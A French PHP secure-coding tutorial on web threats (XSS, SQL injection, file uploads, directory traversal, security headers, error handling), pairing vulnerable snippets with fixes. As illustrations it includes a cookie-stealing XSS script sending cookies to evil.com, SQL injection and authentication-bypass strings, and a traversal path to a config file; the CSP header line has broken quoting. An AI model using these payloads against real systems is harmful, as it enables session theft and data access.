Les grandes menaces web

Les applications web font face a des attaques classiques et bien documentees. La bonne nouvelle : elles se protegent toutes avec des techniques simples, appliquees systematiquement.

01
Attaque 1

XSS — Cross-Site Scripting

XSS — Cross-Site Scripting

Une XSS se produit quand des donnees utilisateur sont affichees dans la page HTML sans etre echappees. L'attaquant injecte du JavaScript qui s'execute dans le navigateur de la victime.

✗ Sans echappement — XSS possible

Vulnérable
<?php
// Nom de produit en BDD : <script>document.location='http://evil.com/steal?c='+document.cookie</script>
echo $_GET['nom'];
// Le script s'execute dans le navigateur !
echo $produit['nom'];
// Meme danger depuis la BDD

✓ Avec htmlspecialchars()

Securise
<?php
// htmlspecialchars() transforme les caracteres speciaux
// < > " & en entites HTML inoffensives
echo htmlspecialchars($_GET['nom'], ENT_QUOTES, 'UTF-8');

// Raccourci : creer une fonction helper
function e(string $v): string {
    return htmlspecialchars($v, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}
echo e($produit['nom']);
XSS dans les attributs HTML et URLs — cas speciauxPHP
<?php
// XSS dans un attribut HTML — toujours ENT_QUOTES pour echapper les guillemets
// DANGEREUX :
// <input value="<?= $_POST['val'] ?>">  ← XSS via " onmouseover="alert(1)

// SECURISE :
echo '<input value="' . htmlspecialchars($_POST['val'], ENT_QUOTES, 'UTF-8') . '">';

// XSS via un attribut href — javascript: URI
// DANGEREUX :
// <a href="<?= $_GET['url'] ?>">  ← javascript:alert(1) passe en clair

// SECURISE : valider le scheme
$url = $_GET['url'] ?? '';
if (!preg_match('#^https?://#', $url)) { $url = '#'; }
echo '<a href="' . htmlspecialchars($url, ENT_QUOTES) . '">';

// Regle : echapper TOUTE variable affichee dans le HTML
// Peu importe la source : $_GET, $_POST, BDD, API externe
!
Les donnees en BDD peuvent aussi etre malveillantes. Si quelqu'un a insere <script>...</script> en BDD (via un ancien formulaire non protege), afficher ce champ sans htmlspecialchars() execute le script. Il faut echapper a l'affichage, pas seulement a la saisie.

Attaque 2

Injection SQL

SQLi — Injection SQL

Une injection SQL injecte du code SQL dans une requete construite par concatenation. L'attaquant peut lire toute la BDD, modifier des donnees, ou contourner l'authentification.

✗ Concatenation — injectable

Vulnérable
<?php
// URL : /produits?id=1 OR 1=1
// SQL genere : SELECT * FROM produits WHERE id = 1 OR 1=1
// => retourne TOUTE la table

// URL : /login?email=' OR 1=1--
// => contourne l'auth completement

$sql = 'SELECT * FROM produits WHERE id = '
      . $_GET['id'];  // INJECTABLE

✓ Requetes preparees PDO

Securise
<?php
// Les parametres sont SEPARES du SQL
// Le moteur SQL les traite comme des donnees, jamais comme du code

$stmt = $pdo->prepare('SELECT * FROM produits WHERE id = ?');
$stmt->execute([(int)$_GET['id']]);  // SECURISE
$produit = $stmt->fetch();
Cas particuliers — ORDER BY et noms de colonnesPHP
<?php
// Les noms de colonnes et les mots-cles SQL ne peuvent pas
// etre des parametres PDO. Il faut valider par whitelist.

// DANGEREUX :
$sql = 'SELECT * FROM produits ORDER BY ' . $_GET['tri']; // injectable

// SECURISE : whitelist des colonnes autorisees
$colonnesAutorisees = ['nom', 'prix', 'stock', 'cree_le'];
$tri = in_array($_GET['tri'] ?? 'nom', $colonnesAutorisees)
    ? $_GET['tri']
    : 'nom';  // valeur par defaut si invalide

$ordre = $_GET['ordre'] === 'desc' ? 'DESC' : 'ASC';

$sql = 'SELECT * FROM produits ORDER BY ' . $tri . ' ' . $ordre;
// $tri et $ordre viennent de listes controlees : pas d'injection possible
+
Les requetes preparees rendent les injections SQL impossibles. Le moteur SQL recoit le SQL et les donnees separement. Meme si $_GET['id'] = "1 OR 1=1", la BDD cherchera un produit dont l'id est litteralement la chaine "1 OR 1=1" — qui n'existera pas.

Attaque 3

Upload de fichiers malveillants

Upload malveillant

Si un attaquant uploade un fichier PHP sur le serveur et peut y acceder via le navigateur, il obtient une execution de code arbitraire sur le serveur. C'est l'une des vulnerabilites les plus critiques.

Upload securise — validation completePHP
<?php
function uploaderImage(array $file, string $dossierDest): string {

    // 1. Verifier les erreurs d'upload
    if ($file['error'] !== UPLOAD_ERR_OK) {
        throw new RuntimeException('Erreur upload : ' . $file['error']);
    }

    // 2. Verifier la taille
    $maxSize = 2 * 1024 * 1024;  // 2 Mo
    if ($file['size'] > $maxSize) {
        throw new RuntimeException('Fichier trop volumineux (max 2 Mo)');
    }

    // 3. Verifier le MIME REEL (pas le type declare par le client)
    // finfo lit les premiers octets du fichier (magic bytes)
    $finfo    = new finfo(FILEINFO_MIME_TYPE);
    $mimeReel = $finfo->file($file['tmp_name']);

    $mimesAutorises = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
    if (!in_array($mimeReel, $mimesAutorises, true)) {
        throw new RuntimeException('Type de fichier non autorise : ' . $mimeReel);
    }

    // 4. Generer un nom aleatoire (pas le nom original)
    $extension = match($mimeReel) {
        'image/jpeg' => 'jpg',
        'image/png'  => 'png',
        'image/gif'  => 'gif',
        'image/webp' => 'webp',
    };
    $nomFichier = bin2hex(random_bytes(16)) . '.' . $extension;

    // 5. Deplacer dans le dossier de destination
    // Ce dossier doit etre HORS de la racine web OU avoir un .htaccess
    $destination = rtrim($dossierDest, '/') . '/' . $nomFichier;
    if (!move_uploaded_file($file['tmp_name'], $destination)) {
        throw new RuntimeException('Impossible de deplacer le fichier');
    }

    return $nomFichier;
}
uploads/.htaccess — bloquer l'execution PHPConfig
# .htaccess dans le dossier uploads/
# Empeche l'execution de tout script
php_flag engine off
RemoveHandler .php .php3 .php5 .phtml
Options -ExecCGI

# Ou : placer uploads/ hors de public/
## Structure recommandee :
mon-projet/
  public/          <-- accessible web
    index.php
  storage/         <-- inaccessible directement
    uploads/       <-- fichiers stockes ici
      images/
!
Ne jamais faire confiance au type MIME declare par le client. $_FILES['fichier']['type'] peut etre falsifie. Utiliser finfo_file() ou new finfo(FILEINFO_MIME_TYPE) qui lit les magic bytes du fichier lui-meme — cette valeur ne peut pas etre falsifiee.

Defense

En-tetes HTTP de securite

Les en-tetes HTTP de securite instruisent le navigateur sur la maniere de gerer le contenu. Ils proteges contre des classes entieres d'attaques sans effort cote application.

En-tetes de securite — front controllerPHP
<?php
// A envoyer sur toutes les pages — de preference dans le front controller

// Empeche le clickjacking (inclusion dans une iframe)
header('X-Frame-Options: DENY');

// Empeche le MIME sniffing (ex: JS deguise en image)
header('X-Content-Type-Options: nosniff');

// Active le filtre XSS des anciens navigateurs
header('X-XSS-Protection: 1; mode=block');

// Force HTTPS (production uniquement)
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');

// Politique de referrer
header('Referrer-Policy: strict-origin-when-cross-origin');

// Content Security Policy — whitelist des sources autorisees
// La plus puissante contre les XSS : bloque les scripts inline et externes non listes
header('Content-Security-Policy: '
    . 'default-src 'self'; '
    . 'script-src 'self' 'nonce-' . $nonce . ''; '
    . 'style-src 'self' 'unsafe-inline'; '
    . 'img-src 'self' data: https:; '
    . 'frame-ancestors 'none''
);

// Ne pas exposer la version de PHP
header_remove('X-Powered-By');
En-teteProtege contre
X-Frame-Options: DENYClickjacking : inclusion de votre page dans une iframe malveillante
X-Content-Type-Options: nosniffMIME sniffing : le navigateur ne reinterprete pas le type du fichier
Strict-Transport-SecurityDowngrade HTTPS vers HTTP : force le navigateur a toujours utiliser HTTPS
Content-Security-PolicyXSS : definit quelles sources de scripts/styles sont autorisees
Referrer-PolicyFuite d'URL : controle les infos envoyees dans le header Referer
X-Powered-By (supprimer)Fingerprinting : n'expose pas la version de PHP aux attaquants
!
CSP est la protection XSS la plus puissante. Avec une politique script-src 'self', le navigateur refuse d'executer tout script qui ne vient pas de votre domaine, meme si une XSS a reussi a injecter une balise <script src="evil.com/...">.

Defense

Validation serveur

La validation cote client (HTML5, JavaScript) peut etre contournee. La validation cote serveur est obligatoire et doit etre la seule source de verite.

Validation serveur — fonctions PHP nativesPHP
<?php
// Fonctions de validation PHP natives

// Email
filter_var($email, FILTER_VALIDATE_EMAIL);

// URL
filter_var($url, FILTER_VALIDATE_URL);

// Entier dans une plage
filter_var($age, FILTER_VALIDATE_INT, ['options' => ['min_range' => 0, 'max_range' => 120]]);

// Float
filter_var($prix, FILTER_VALIDATE_FLOAT);

// IP
filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4);

// Nettoyer une entree (supprimer balises HTML)
filter_var($input, FILTER_SANITIZE_SPECIAL_CHARS);

// Validation manuelle — classe Validator maison
function validateProduit(array $data): array {
    $errors = [];
    if (empty(trim($data['nom'] ?? '')))                          $errors['nom']   = 'Requis';
    if (strlen($data['nom'] ?? '') > 200)                            $errors['nom']   = 'Max 200 caracteres';
    if (!filter_var($data['prix'] ?? '', FILTER_VALIDATE_FLOAT))    $errors['prix']  = 'Nombre invalide';
    if (($data['prix'] ?? -1) < 0)                                   $errors['prix']  = 'Prix negatif interdit';
    if (!filter_var($data['stock'] ?? '', FILTER_VALIDATE_INT))    $errors['stock'] = 'Entier requis';
    return $errors;
}
!
La validation HTML5 et JavaScript est cosmétique. Un attaquant utilise curl, Postman ou les DevTools pour envoyer des requetes sans passer par votre formulaire. La validation serveur en PHP est la seule contrainte reelle.

Attaque 4

Directory traversal

Le directory traversal exploite les sequences ../ dans un nom de fichier pour acceder a des fichiers hors du dossier prevu. Il peut exposer des fichiers de configuration, des mots de passe, etc.

✗ Nom de fichier non verifie

Vulnérable
<?php
// URL : /download?file=../../config/database.php
// Expose le fichier de config avec les mots de passe !

$fichier = 'uploads/' . $_GET['file'];
readfile($fichier);  // DANGEREUX

✓ Validation avec realpath()

Securise
<?php
$dossierBase = realpath(__DIR__ . '/uploads');
$chemin      = realpath($dossierBase . '/' . $_GET['file']);

// Verifier que le chemin resolu est bien dans uploads/
if ($chemin === false || !str_starts_with($chemin, $dossierBase)) {
    http_response_code(403); exit;
}
readfile($chemin);  // SECURISE
i
realpath() resout les sequences ../ et les liens symboliques. realpath('/var/www/uploads/../../../etc/passwd') renvoie '/etc/passwd'. En verifiant que le resultat commence bien par le dossier de base avec str_starts_with(), on garantit que le fichier est dans le bon dossier.

Defense

Exposition de donnees et erreurs

En production, les messages d'erreur PHP detailles exposent des informations precieuses aux attaquants : chemins de fichiers, noms de tables, version PHP, mots de passe dans les DSN.

Configuration PHP — production vs developpementPHP
<?php
// En developpement : afficher toutes les erreurs
if (getenv('APP_ENV') === 'development') {
    ini_set('display_errors',         '1');
    ini_set('display_startup_errors',  '1');
    error_reporting(E_ALL);

// En production : logguer sans afficher
} else {
    ini_set('display_errors',   '0');
    ini_set('log_errors',       '1');
    ini_set('error_log',        '/var/log/php/app_errors.log');
    error_reporting(E_ALL);
}

// Gestionnaire d'erreurs global
set_exception_handler(function(Throwable $e): void {
    error_log($e->getMessage() . ' in ' . $e->getFile() . ':' . $e->getLine());

    if (getenv('APP_ENV') !== 'development') {
        http_response_code(500);
        echo 'Une erreur est survenue. Veuillez reessayer.';
        exit;
    }
    // En dev : lancer une exception pour voir la stacktrace
    throw $e;
});
!
Les messages d'erreur SQL sont une mine d'or pour un attaquant. Un message comme "Table 'boutique.users' doesn't exist" revele le nom de la BDD, le nom de la table, et confirme une injection. En production, logger l'erreur et afficher uniquement un message generique.

Checklist de securite complete

Checklist de securite a verifier avant chaque mise en production.

Checklist securite PHP — reference completePHP
/* ====== SORTIES ====== */
// [ ] htmlspecialchars() sur toute variable affichee dans le HTML
// [ ] ENT_QUOTES pour les attributs HTML
// [ ] Valider les URLs (https?:// seulement)

/* ====== BASE DE DONNEES ====== */
// [ ] Requetes preparees PDO sur TOUTES les valeurs externes
// [ ] Whitelist pour ORDER BY et noms de colonnes
// [ ] ATTR_EMULATE_PREPARES = false

/* ====== AUTHENTIFICATION ====== */
// [ ] password_hash(PASSWORD_BCRYPT) pour les mots de passe
// [ ] session_regenerate_id(true) apres connexion
// [ ] Token CSRF sur tous les formulaires POST
// [ ] hash_equals() pour comparer les tokens

/* ====== UPLOAD ====== */
// [ ] Verifier le MIME avec finfo (pas $_FILES[type])
// [ ] Renommer le fichier (nom aleatoire bin2hex)
// [ ] Stocker hors de la racine web OU .htaccess php_flag engine off

/* ====== FICHIERS ====== */
// [ ] realpath() + str_starts_with() pour les inclusions de fichiers

/* ====== EN-TETES HTTP ====== */
// [ ] X-Frame-Options: DENY
// [ ] X-Content-Type-Options: nosniff
// [ ] Strict-Transport-Security (HTTPS)
// [ ] Content-Security-Policy
// [ ] header_remove(X-Powered-By)

/* ====== CONFIGURATION ====== */
// [ ] display_errors = 0 en production
// [ ] error_log actif
// [ ] .env non accessible depuis le web
// [ ] vendor/ non accessible depuis le web
// [ ] Permissions fichiers restrictives (644 / 755)
OK
Principe de defense en profondeur. Chaque couche protege contre une attaque differente. Une XSS peut passer les CSP si les headers manquent. Une injection SQL peut passer si les requetes preparees ne sont pas utilisees. Toutes les mesures doivent etre appliquees ensemble.
